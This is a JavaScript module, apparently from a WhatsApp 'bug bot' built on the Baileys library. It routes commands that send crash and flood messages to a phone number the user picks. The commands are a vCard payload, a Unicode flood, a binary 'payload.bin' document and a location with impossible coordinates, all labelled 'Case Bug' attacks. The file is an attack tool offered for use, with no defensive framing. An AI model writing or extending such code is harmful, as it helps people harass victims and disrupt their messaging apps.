// ==========================================
// Case Bug Command Handler & Gacor Router
// ==========================================

const { generateVCardPayload } = require('./functions/vcardGacor');
const { generateUnicodePayload } = require('./functions/unicodeFlood');

async function handleCaseBug(command, rawTarget, sock, options = {}) {
  if (!sock) throw new Error("WhatsApp Baileys Socket is not ready or logged in!");

  const targetJid = rawTarget.includes('@s.whatsapp.net') 
    ? rawTarget 
    : `${rawTarget.replace(/\D/g, '')}@s.whatsapp.net`;

  console.log(`[CASE BUG] Executing ${command} on ${targetJid}`);

  switch (command) {
    case 'vcard_gacor':
      const vcardPayload = generateVCardPayload(targetJid);
      return await sock.sendMessage(targetJid, vcardPayload);

    case 'unicode_flood':
      const unicodePayload = generateUnicodePayload();
      return await sock.sendMessage(targetJid, unicodePayload);

    case 'document_crash':
      return await sock.sendMessage(targetJid, {
        document: Buffer.from("SYNTHETIC_CRASH_STREAM"),
        mimetype: "application/octet-stream",
        fileName: "payload.bin"
      });

    case 'location_malformed':
      return await sock.sendMessage(targetJid, {
        location: { degreesLatitude: 999.0, degreesLongitude: 999.0 }
      });

    default:
      throw new Error(`Unknown Case Bug command: ${command}`);
  }
}

module.exports = { handleCaseBug };